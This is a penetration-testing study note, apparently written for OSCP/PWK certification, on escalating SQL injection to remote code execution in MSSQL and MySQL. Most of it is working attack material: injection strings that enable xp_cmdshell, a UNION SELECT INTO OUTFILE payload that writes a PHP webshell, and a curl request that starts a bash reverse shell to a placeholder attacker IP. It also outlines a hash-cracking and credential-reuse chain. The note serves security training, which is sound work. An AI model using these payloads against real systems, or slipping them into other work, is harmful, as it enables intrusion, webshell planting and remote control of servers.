---
title: "SQLi to RCE — Attack Chains by Database"
created: "2026-04-04"
type: permanent-note
status: active
tags:
  - permanent-note
  - sqli
  - rce
  - mssql
  - mysql
  - oscp
---

# SQLi to RCE — Attack Chains by Database

**Core idea:** SQL injection isn't just about reading data. Both MySQL and MSSQL have built-in mechanisms to reach the OS — knowing which tool to use for each database is the difference between "I dumped some hashes" and "I have a shell."

---

## MSSQL → xp_cmdshell (Windows)

```
SQLi found → enable xp_cmdshell → EXECUTE 'whoami' → PowerShell reverse shell
```

**Why it's powerful:** `xp_cmdshell` runs commands as the MSSQL service account (`nt service\mssql$sqlexpress` or `nt authority\system` in misconfigured installations).

**The enablement sequence (required every time it's off):**
```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

**From SQLi injection point (not direct console):**
```sql
'; EXECUTE sp_configure 'show advanced options',1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXECUTE xp_cmdshell 'whoami';--
```

---

## MySQL → INTO OUTFILE (Linux)

```
SQLi found → UNION SELECT INTO OUTFILE → write PHP webshell → curl webshell → shell
```

**Why it's powerful:** If MySQL has FILE privilege and the web root is writable by `www-data`, you can write any file to disk — including a PHP webshell.

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null
  INTO OUTFILE "/var/www/html/tmp/shell.php" -- //
```

**Then:**
```bash
curl "http://target/tmp/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

---

## When You Can't Get RCE

Even without code execution, SQLi still gives you:
- **Credential hashes** → crack with hashcat → reuse for SSH/RDP
- **Plaintext passwords** (poorly secured apps) → direct login
- **App config files** (via file-read) → DB passwords, API keys

**The credential reuse chain:**
```
Dump password hash → hashcat → plaintext → SSH as user → local privesc → root
```

---

## Quick Decision: Which Path?

| DB | OS | RCE Method | Requirements |
|----|-----|------------|-------------|
| MSSQL | Windows | `xp_cmdshell` | sysadmin privilege |
| MySQL | Linux | `INTO OUTFILE` | FILE privilege + writable web dir |
| MySQL | Any | sqlmap `--os-shell` | Same as INTO OUTFILE |
| Any | Any | Crack hashes + SSH | Password reuse |

---

## Connections

- [[PWK-Module-10-SQL-Injection]] — full module with all payloads and commands
- Credential hashes from SQLi → crack with hashcat (covered in Module 16)
- MSSQL xp_cmdshell → PowerShell reverse shell patterns (same as Command Injection)
- sqlmap `--os-shell` automates the MySQL INTO OUTFILE path

---

*From: PWK Module 10, pages 298-304*
